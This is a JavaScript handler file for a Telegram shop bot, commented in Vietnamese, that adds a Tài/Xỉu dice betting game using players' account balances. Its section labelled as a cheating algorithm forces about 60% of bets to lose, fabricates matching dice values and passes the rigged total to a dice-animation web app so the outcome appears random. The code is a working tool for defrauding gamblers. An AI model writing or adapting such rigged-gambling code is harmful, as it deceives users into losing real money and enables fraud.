const productService = require('../services/productService');
const messages = require('../utils/messages');
const { quantityKeyboard, productListKeyboard, formatPrice } = require('../utils/keyboard');
const config = require('../config');
const userService = require('../services/userService');
const { Markup } = require('telegraf');

module.exports = (bot) => {
    // 1. Xử lý chọn sản phẩm
    bot.action(/^product_(\d+)$/, async (ctx) => {
        const productId = parseInt(ctx.match[1]);
        const product = await productService.getById(productId);
        if (!product) return ctx.answerCbQuery('❌ Sản phẩm không tồn tại');
        await ctx.answerCbQuery();

        if (product.contact_only) {
            const buttons = [];
            const adminUsername = config.SUPPORT_CONTACT.replace('@', '');
            buttons.push([Markup.button.url('💬 Liên hệ mua', `https://t.me/${adminUsername}`)]);
            if (product.contact_url) buttons.push([Markup.button.url('📱 Hotline Zalo 24/7', product.contact_url)]);
            buttons.push([Markup.button.callback('↩️ Quay lại', 'refresh_products')]);
            return ctx.replyWithHTML(messages.contactOnly(product), Markup.inlineKeyboard(buttons));
        }

        const availableStock = product.display_stock || product.stock_count;
        if (availableStock === 0) return ctx.reply(messages.noStock);
        const maxQty = Math.min(availableStock, 10);
        ctx.replyWithHTML(messages.selectQuantity(product), quantityKeyboard(productId, maxQty));
    });

    // 2. Khi bấm nút TÀI hoặc XỈU
    bot.action(/^bet_(tai|xiu)$/, async (ctx) => {
        const choice = ctx.match[1];
        await ctx.answerCbQuery();
        
        ctx.session = ctx.session || {};
        ctx.session.betChoice = choice;

        const choiceName = choice === 'tai' ? '🔴 TÀI' : '🔵 XỈU';
        
        ctx.replyWithHTML(
            `Bạn đã chọn cược <b>${choiceName}</b>.\n\n` +
            `💰 Vui lòng nhập <b>số tiền</b> bạn muốn cược (Ví dụ: 10000):\n\n` +
            `Gõ /cancel để hủy.`
        );
    });

    // 3. Hủy đặt cược
    bot.command('cancel', (ctx) => {
        if (ctx.session && ctx.session.betChoice) {
            ctx.session.betChoice = null;
            return ctx.reply('❌ Đã hủy đặt cược.');
        }
    });

    // 4. Bắt sự kiện người chơi nhập số tiền
    bot.on('text', async (ctx, next) => {
        if (!ctx.session || !ctx.session.betChoice) return next();

        const text = ctx.message.text.trim();
        if (text.startsWith('/')) return next();

        const amount = parseInt(text);
        if (isNaN(amount) || amount <= 0) {
            return ctx.reply('❌ Số tiền không hợp lệ. Vui lòng nhập lại (Ví dụ: 10000).');
        }

        const user = await userService.get(ctx.from.id);
        const userBalance = Number(user ? user.balance : 0);

        if (!user || userBalance < amount) {
            return ctx.reply(`❌ Số dư của bạn không đủ. Số dư hiện tại: ${formatPrice(userBalance)}`);
        }

        const choice = ctx.session.betChoice;
        
        // Xóa session cược cũ
        ctx.session.betChoice = null;

        // ═══════════════════════════════════════
        // 5. THUẬT TOÁN GIAN LẬN & CHUẨN BỊ KẾT QUẢ
        // ═══════════════════════════════════════
        // 60% người chơi sẽ bị ép thua (Bạn có thể đổi số 0.6 này)
        const isForcedLose = Math.random() < 0.6; 
        
        let finalTotal;

        if (isForcedLose) {
            // Ép thua: Tạo ra kết quả ngược lại với lựa chọn của người chơi
            if (choice === 'tai') {
                finalTotal = Math.floor(Math.random() * 8) + 3; // Random 3-10 (Xỉu)
            } else {
                finalTotal = Math.floor(Math.random() * 8) + 11; // Random 11-18 (Tài)
            }
        } else {
            // Cho thắng: Tạo ra kết quả trùng với lựa chọn của người chơi
            if (choice === 'tai') {
                finalTotal = Math.floor(Math.random() * 8) + 11; // Random 11-18 (Tài)
            } else {
                finalTotal = Math.floor(Math.random() * 8) + 3; // Random 3-10 (Xỉu)
            }
        }

        // Lưu tạm thông tin vào session để xử lý sau khi Web App đóng
        ctx.session.finalTotal = finalTotal;
        ctx.session.amount = amount;
        ctx.session.choice = choice;

        // ═══════════════════════════════════════
        // 6. GỬI NÚT MỞ WEB APP XÚC XẮC
        // ═══════════════════════════════════════
        const webAppUrl = `https://telegram-shop-bot-696z.onrender.com/dice.html?force=${finalTotal}`;

        // Lưu lại tin nhắn chứa nút bấm để tí nữa xóa nút
        const betMessage = await ctx.replyWithHTML(
            `🎲 <b>Đã nhận cược ${formatPrice(amount)}</b>\n\n` +
            `Bấm nút bên dưới để xem kết quả!`,
            Markup.inlineKeyboard([
                [Markup.button.webApp('🎲 Lắc Xúc Xắc', webAppUrl)]
            ])
        );

        // ═══════════════════════════════════════
        // 7. TỰ ĐỘNG THÔNG BÁO KẾT QUẢ SAU 5 GIÂY
        // ═══════════════════════════════════════
        // Đợi 5 giây (đủ để khách mở web app xem hiệu ứng) rồi tự động thông báo kết quả
        setTimeout(async () => {
            try {
                const total = ctx.session.finalTotal;
                const betAmount = ctx.session.amount;
                const betChoice = ctx.session.choice;
                
                // Xóa session sau khi lấy xong
                delete ctx.session.finalTotal;
                delete ctx.session.amount;
                delete ctx.session.choice;

                // XÓA NÚT BẤM TRÊN TIN NHẮN CŨ
                try {
                    await ctx.telegram.editMessageReplyMarkup(
                        ctx.chat.id,
                        betMessage.message_id,
                        undefined,
                        Markup.inlineKeyboard([]) // Xóa sạch các nút
                    );
                } catch (e) {
                    console.error('Lỗi xóa nút:', e.message);
                }

                const resultName = total >= 11 ? 'TÀI' : 'XỈU';
                const choiceName = betChoice === 'tai' ? 'TÀI' : 'XỈU';
                const diceEmojis = ['', '⚀', '⚁', '⚂', '⚃', '⚄', '⚅'];

                // Tạo lại 3 con số khớp với tổng điểm để hiển thị
                let d1, d2, d3;
                do {
                    d1 = Math.floor(Math.random() * 6) + 1;
                    d2 = Math.floor(Math.random() * 6) + 1;
                    d3 = Math.floor(Math.random() * 6) + 1;
                } while (d1 + d2 + d3 !== total);

                const diceMsg = 
                    `🎲 <b>KẾT QUẢ LẮC XÚC XẮC</b> 🎲\n\n` +
                    `${diceEmojis[d1]}  ${diceEmojis[d2]}  ${diceEmojis[d3]}\n\n` +
                    `🔢 Tổng điểm: <b>${total}</b> => <b>${resultName}</b>\n\n` +
                    `Bạn đã cược: <b>${choiceName}</b> (${formatPrice(betAmount)})\n`;

                // Trừ tiền cược
                await userService.deductBalance(ctx.from.id, betAmount);
                
                // Kiểm tra thắng thua
                const isWin = (betChoice === 'tai' && total >= 11) || (betChoice === 'xiu' && total < 11);

                if (isWin) {
                    // THẮNG
                    const winnings = betAmount; 
                    await userService.addBalance(ctx.from.id, betAmount + winnings); 
                    const updatedUser = await userService.get(ctx.from.id);
                    const newBalance = Number(updatedUser.balance);
                    
                    await ctx.replyWithHTML(
                        diceMsg +
                        `\n🎉 <b>CHÚC MỪNG! BẠN ĐÃ THẮNG</b>\n` +
                        `💰 Tiền thắng: <b>+${formatPrice(winnings)}</b>\n` +
                        `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
                    );

                    try {
                        const adminMsg = 
                            `🎉 <b>NGƯỜI CHƠI THẮNG</b>\n\n` +
                            `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
                            `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
                            `💰 Tiền cược: <b>${formatPrice(betAmount)}</b>\n` +
                            `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
                        await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
                    } catch (e) { console.error(e); }

                } else {
                    // THUA
                    const updatedUser = await userService.get(ctx.from.id);
                    const newBalance = Number(updatedUser.balance);
                    
                    await ctx.replyWithHTML(
                        diceMsg +
                        `\n😢 <b>RẤT TIẾC! BẠN ĐÃ THUA</b>\n` +
                        `💸 Tiền mất: <b>-${formatPrice(betAmount)}</b>\n` +
                        `💳 Số dư mới: <b>${formatPrice(newBalance)}</b>`
                    );

                    try {
                        const adminMsg = 
                            `😢 <b>NGƯỜI CHƠI THUA</b>\n\n` +
                            `👤 Khách: <b>${ctx.from.first_name}</b> (<code>${ctx.from.id}</code>)\n` +
                            `🎲 Cược: <b>${choiceName}</b> | Kết quả: <b>${resultName}</b> (${total} điểm)\n` +
                            `💸 Tiền mất: <b>${formatPrice(betAmount)}</b>\n` +
                            `💵 Số dư mới: <b>${formatPrice(newBalance)}</b>`;
                        await bot.telegram.sendMessage(config.ADMIN_ID, adminMsg, { parse_mode: 'HTML' });
                    } catch (e) { console.error(e); }
                }

                // Gửi lại menu chơi
                ctx.reply('Chơi tiếp?', productListKeyboard([]));

            } catch (e) { 
                console.error("Lỗi xử lý kết quả sau 5s:", e); 
            }
        }, 5000); // Đợi 5 giây
    });
};